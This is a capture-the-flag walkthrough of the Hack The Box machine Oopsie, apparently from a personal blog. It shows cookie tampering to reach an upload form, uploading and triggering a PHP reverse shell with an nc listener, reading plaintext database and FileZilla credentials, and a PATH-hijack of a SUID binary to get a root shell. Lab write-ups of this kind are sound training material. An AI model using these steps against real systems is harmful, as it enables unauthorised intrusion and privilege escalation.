Oopsie is a Linux machine from HTB, it was fun and informative as for initial foothold attacker need to perform cookie manipulation and upload a file to get a rev shell. next perform basic password hunting on target and switch user with found credentials. lastly enumerate for a SUID binary and exploit it using environment PATH variable.

## Enumeration

### Nmap 

```bash

* I have some trick to identify the Operating System using SSH version. I got it from IPPSEC walkthroughs.
* Here is the trick. If you see the SSH version like ‚Äú**OpenSSH 7.6p1 Ubuntu 4ubuntu0.3‚Äù** just copy it and search through google. In the search results you can find domain called launchpad.net. It contains some important details like Ubuntu Releases, last update, publishing details and more important is builds. Likewise, in this case it is Bionic.

* Now we know the operating system is Ubuntu and we have open ports 22 (SSH) and 80 (HTTP). Let‚Äôs go to the port 80 first.

### HTTP - 80

* visiting the ip in browser got us to this page.

![](2025-05-31-oopsie-3.png)

* using directory brute- forcing found following new directories.

![](2025-05-31-oopsie-4.png)

* Another scan using a different wordlist from the same Seclist package I came across the cdn-cgi directory, naturally, I aimed gobuster with common.txt again.

![](2025-05-31-oopsie-5.png)

* aah a login page, lets move to it.

```
admin : admin
admin : admin123
admin : password
admin : pa$$w0rd
```

* It contains a login page. lets check basic
* After trying a couple of default username/password combinations, we didn‚Äôt managed to get any access. But there is also an option to Login as Guest .
* Trying that and now we are presented with couple of new navigation options as we are logged in as Guest:

![](2025-05-31-oopsie-6.png)

* After navigating through the available pages, we spot that the only interesting one seems to be the Uploads . However it is not possible to access it as we need to have super admin rights:

![](2025-05-31-oopsie-7.png)

* We need to find a way to escalate our privileges from user Guest to super admin role.
* One way to try this is by checking if cookies and sessions can be manipulated.

```
Cookies are text files with small pieces of data created by the web server, stored by
the browser into the computer file system and being used to identify a user while is
browsing a website.
```

* It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools.
* Developer tools is a set of web developer tools built into Firefox. You can use them to examine, edit, and debug HTML, CSS, and JavaScript
* In order to enter the Developer Tools panel we need to right click in the content of the webpage and select the Inspect Element(Q) .

![](2025-05-31-oopsie-8.png)

* Then we can navigate to Storage section where Cookies are being presented. As one can observe, there is a `role=guest` and `user=2233` which we can assume that if we somehow knew the number of super admin for the user variable, we might be able to gain access to the upload page.

![](2025-05-31-oopsie-9.png)

* We check the URL on our browsers bar again where there is an id for every user:
* `http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2`
* We can try change the id variable to something else like for example 1 to see if we can enumerate the users:
* `http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1`

![](2025-05-31-oopsie-10.png)

* Indeed we got an information disclosure vulnerability, which we might be able to abuse. We now know the access ID of the admin user thus we can try to change the values in our cookie through the Developer tools so the user value to be 34322 and role value to be admin.
* Then we can revisit the Uploads page.

![](2025-05-31-oopsie-11.png)

* We finally got access to the upload form.

## Exploitation

* now as we have access to uploads form.
* Let‚Äôs check whether we can upload PHP web shell or what kind of file type are they need to be uploaded. First copy the PHP Reverse shell to our current directory.

```sh
cp /usr/share/webshells/php/php-reverse-shell.php .
```

* Then we can open that `php-reverse-shell.php` whatever text editor you like and edit the below changes. üëá

![](2025-05-31-oopsie-12.png)

* next upload it like a normal fil

![](2025-05-31-oopsie-13.png)

* as we already know we have a upload directory on target.
* Now it‚Äôs time to powerup netcat listener and we can use curl command to fetch the uploaded file.

```bash
nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
curl http://10.10.10.28/uploads/php-reverse-shell.php
```

![](2025-05-31-oopsie-14.png)

* We got a reverse shell! In order to have a functional shell though we can issue the following:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Post Exploitation

* First check web user directory where it has some interesting information.

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js
```

* Here we found `db.php` file in `/var/www/html/cdn-cgi/`login directory. let‚Äôs view this file.

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

* Oh! here we found new user credentials.
* `robert:M3g4C0rpUs3r!`
* So let‚Äôs access Robert‚Äôs user, providing the password found. `su robert`

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$
```

* Yes it works and now we are in robert user. we can view our user flag now. Let‚Äôs check and submit it to HTB.

```bash
robert@oopsie:~$ cat user.txt
cat user.txt
f2c74*******************b7981
```

### Root

* Now we are on the last step. we need to find root flag.
* Now we are robert. So again, look around the file system, First we can use `id` command to verify in which user group we are now. Let‚Äôs check it.

```bash
robert@oopsie:/$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

* As above result; we see that this robert is part of a `bugtrack` group. Now let‚Äôs check for what files this group has the access.

```bash
find / -type f -group bugtracker 2> /dev/null
```

```bash
robert@oopsie:/$ find / -type f -group bugtracker 2> /dev/null
find / -type f -group bugtracker 2> /dev/null
/usr/bin/bugtracker
```

* There is a binary file called`bugtracker` and also we notice that it has SUID permissions.

```bash
robert@oopsie:/$ ls -l /usr/bin/bugtracker
ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

* Let‚Äôs run the file and check what are the mess around that file.

```bash
robert@oopsie:/$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 000
000
---------------

cat: /root/reports/000: No such file or directory
```

* Nothing interesting found. let‚Äôs check `strings` command to analyze the binary file for any hard-coded information.

```bash
strings /usr/bin/bugtracker
```

![](2025-05-31-oopsie-15.png)

* When looking around the output, you can see that it looks like a system command which is calling the `cat` command using the relative path instead of the absolute path. So what‚Äôs on your mind now. yes we can create malicious file called cat and modifying the path to include the current working directory. Using that method we can abuse this misconfiguration and escalate our privileges to root.
* Let‚Äôs create the file, make it as executable and add the current working directory to PATH.

```bash
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
```

* Now let‚Äôs run the `/usr/bin/bugtracker` binary again.

![](2025-05-31-oopsie-16.png)

* Now we are landing as root. The last step; let‚Äôs check the root flag and submit it to the HTB.

```bash
#cd /root
#ls 
reports  root.txt
```

### Beyond root

* Inside the root‚Äôs folder, we see a `.config` folder, which contains a FileZilla config file with the credentials `ftpuser / mc@F1l3ZilL4` visible in plain text.

```xml
# cat filezilla.xml  
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
